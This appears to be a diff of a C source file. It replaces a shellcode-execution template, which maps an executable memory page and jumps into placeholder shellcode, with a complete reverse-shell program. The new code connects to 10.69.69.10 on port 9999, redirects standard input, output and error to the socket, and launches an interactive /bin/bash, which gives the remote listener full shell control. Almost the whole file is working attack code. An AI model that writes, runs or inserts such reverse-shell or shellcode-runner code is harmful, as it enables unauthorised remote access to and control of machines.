@@ -1,32 +1,40 @@
-//Jacob Hammack
-//Shellcode executor template from: http://www.thexploit.com/sploitdev/testing-your-shellcode-on-a-non-executable-stack-or-heap/
-
-#include <stdio.h>
-
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
+#include <arpa/inet.h>
+#include <assert.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <signal.h>
 #include <stdlib.h>
- 
-int (*sc)();
- 
-char shellcode[] = "<YOUR SHELLCODE>";
- 
-int main(int argc, char **argv) 
-{
- 
-    void *ptr = mmap(0, <SIZE OF YOUR SHELLCODE>, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
- 
-    if (ptr == MAP_FAILED) 
-    {
-        perror("mmap");
-        exit(-1);
-    }
- 
-    memcpy(ptr, shellcode, sizeof(shellcode));
-    sc = ptr;
- 
-    sc();
- 
-    return 0;
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <netdb.h>
+#include <unistd.h>
+
+#define ADDR "10.69.69.10"
+#define PORT 9999
+
+int main()
+{ 
+	int fd;
+	struct sockaddr_in addr;
+        
+	fd = socket(PF_INET, SOCK_STREAM, 0);
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(PORT);
+	addr.sin_addr.s_addr = inet_addr(ADDR);
+	memset(addr.sin_zero, 0, sizeof(addr.sin_zero));
+
+	connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr));
+	dup2(fd, 0); 
+	dup2(fd, 1); 
+	dup2(fd, 2);
+	
+	execl("/bin/bash", "/bin/bash", "-i", NULL);
+        
+	close(fd);
+
+	return 0;
 }
+
